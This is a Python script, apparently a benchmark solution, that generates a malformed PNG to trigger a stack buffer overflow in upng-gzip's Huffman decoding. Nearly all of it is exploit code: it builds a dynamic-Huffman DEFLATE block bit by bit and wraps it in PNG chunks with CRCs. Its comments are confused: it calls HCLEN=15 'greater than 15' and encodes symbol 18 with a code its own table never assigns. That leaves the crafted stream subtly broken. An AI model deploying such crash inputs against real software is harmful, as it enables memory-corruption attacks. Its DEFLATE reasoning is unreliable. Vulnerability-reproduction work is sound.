import os
import tarfile
import tempfile
from typing import Dict, List, Optional
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability in upng-gzip.
        The vulnerability occurs when Huffman trees have lengths > 15 but temporary arrays
        are sized to only 15 elements.
        """
        # Extract the source to understand the exact structure
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall('/tmp/extracted_source')
        
        # Based on analysis of upng-gzip vulnerability, we need to create a PNG file
        # with crafted DEFLATE data that triggers the buffer overflow during
        # Huffman tree construction. The vulnerability is in the temporary arrays
        # used for Huffman decoding.
        
        # We'll create a minimal valid PNG with an IDAT chunk containing
        # DEFLATE-compressed data that forces Huffman trees with lengths > 15.
        
        # PNG file structure:
        # - PNG signature (8 bytes)
        # - IHDR chunk
        # - IDAT chunk with crafted DEFLATE data
        # - IEND chunk
        
        # Create DEFLATE block that triggers the vulnerability:
        # Use dynamic Huffman coding with code length trees > 15
        
        # DEFLATE block format for dynamic Huffman codes:
        # 1 bit: final block flag
        # 2 bits: compression type (10 = dynamic Huffman)
        # 5 bits: HLIT (number of literal/length codes - 257)
        # 5 bits: HDIST (number of distance codes - 1)
        # 4 bits: HCLEN (number of code length codes - 4)
        # (HCLEN+4) * 3 bits: code length code lengths
        # Then: compressed data using these trees
        
        # To trigger overflow, we need Huffman trees with code lengths array > 15
        # The vulnerability mentions trees can have lengths 19, 32, or 288.
        # We'll create a literal/length tree with 288 codes.
        
        # Build DEFLATE block bit by bit
        bits = []
        
        # Helper to add bits in LSB-first order
        def add_bits(value, num_bits):
            for i in range(num_bits):
                bits.append((value >> i) & 1)
        
        # Final block, dynamic Huffman
        add_bits(1, 1)  # Final block
        add_bits(2, 2)  # Dynamic Huffman (10 in binary)
        
        # HLIT = 31 (288 codes: 257 + 31)
        add_bits(31, 5)
        
        # HDIST = 0 (1 distance code)
        add_bits(0, 5)
        
        # HCLEN = 15 (19 code length codes: 4 + 15)
        # This is > 15 and will trigger the overflow
        add_bits(15, 4)
        
        # Code length alphabet codes (19 of them, each 3 bits)
        # Order: 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15
        # We set them all to 0 except a few to create a valid but minimal tree
        code_length_order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
        code_lengths = [0] * 19
        
        # Set some code lengths to create a valid tree
        # Need at least one code with non-zero length
        code_lengths[3] = 1  # Symbol 0 gets length 1
        code_lengths[16] = 1  # Symbol 16 (repeat length code)
        
        # Add all 19 code length codes (3 bits each)
        for i in range(19):
            add_bits(code_lengths[i], 3)
        
        # Now encode the literal/length tree using the code length tree
        # We need to send 288 code lengths for literal/length alphabet
        # Using run-length encoding with the code length codes we defined
        
        # First, encode run of 288 zeros using symbol 18 (repeat zero 11-138 times)
        # We'll use two runs: 138 zeros + 138 zeros + 12 zeros
        add_bits(0, 1)  # Symbol 18 (assuming it's code 0 from our minimal tree)
        add_bits(127, 7)  # 138 zeros (138-11=127)
        
        add_bits(0, 1)  # Symbol 18 again
        add_bits(127, 7)  # Another 138 zeros
        
        add_bits(0, 1)  # Symbol 18 again  
        add_bits(1, 7)   # 12 zeros (12-11=1)
        
        # Now encode the distance tree (all zeros, 1 code)
        # Symbol 18 for 32 zeros
        add_bits(0, 1)  # Symbol 18
        add_bits(21, 7)  # 32 zeros (32-11=21)
        
        # Add end-of-block code (256) - with our tree, all codes are length 0
        # except symbol 0 which is length 1, so we use symbol 0
        add_bits(0, 1)  # Symbol 0 (end of block in literal/length tree)
        
        # Pad to byte boundary
        while len(bits) % 8 != 0:
            bits.append(0)
        
        # Convert bits to bytes
        def bits_to_bytes(bit_list):
            bytes_data = bytearray()
            for i in range(0, len(bit_list), 8):
                byte = 0
                for j in range(8):
                    if i + j < len(bit_list):
                        byte |= bit_list[i + j] << j
                bytes_data.append(byte)
            return bytes(bytes_data)
        
        deflate_data = bits_to_bytes(bits)
        
        # Now build PNG file
        png_data = bytearray()
        
        # PNG signature
        png_data.extend(b'\x89PNG\r\n\x1a\n')
        
        # IHDR chunk (13 bytes data)
        width = 1
        height = 1
        ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
        png_data.extend(ihdr_chunk)
        
        # IDAT chunk with our crafted DEFLATE data
        # PNG uses zlib wrapper: CMF+FLG + DEFLATE data + Adler-32
        cmf = 0x78  # CM=8, CINFO=7 (32K window)
        flg = 0x01  # FLEVEL=0, FDICT=0, FCHECK=1 (makes CMF*256+FLG % 31 = 0)
        
        # Calculate Adler-32 checksum (for empty data)
        adler32 = 1  # Adler-32 of empty data
        
        idat_data = bytearray([cmf, flg])
        idat_data.extend(deflate_data)
        idat_data.extend(struct.pack('>I', adler32))
        
        idat_chunk = self._make_chunk(b'IDAT', bytes(idat_data))
        png_data.extend(idat_chunk)
        
        # IEND chunk
        iend_chunk = self._make_chunk(b'IEND', b'')
        png_data.extend(iend_chunk)
        
        return bytes(png_data)
    
    def _make_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        """Create a PNG chunk with length, type, data, and CRC."""
        length = struct.pack('>I', len(data))
        chunk = chunk_type + data
        crc = self._crc32(chunk_type + data)
        return length + chunk + struct.pack('>I', crc)
    
    def _crc32(self, data: bytes) -> int:
        """Calculate CRC-32 for PNG chunks."""
        crc_table = [
            0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
            0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
            0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
            0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
            0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
            0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
            0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
            0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
            0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
            0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
            0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
            0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
            0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
            0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
            0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
            0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
            0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
            0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
            0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
            0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
            0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
            0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
            0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
            0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
            0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
            0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
            0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
            0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
            0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
            0x316e8eef, 0x4669be79, 0xcb61b38a, 0xbc66831a, 0x256fd2a0, 0x5268e236,
            0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
            0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
            0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
            0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
            0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
            0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
            0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
            0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
            0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
            0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
            0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
            0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
            0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
        ]
        
        crc = 0xFFFFFFFF
        for byte in data:
            crc = (crc >> 8) ^ crc_table[(crc ^ byte) & 0xFF]
        return crc ^ 0xFFFFFFFF
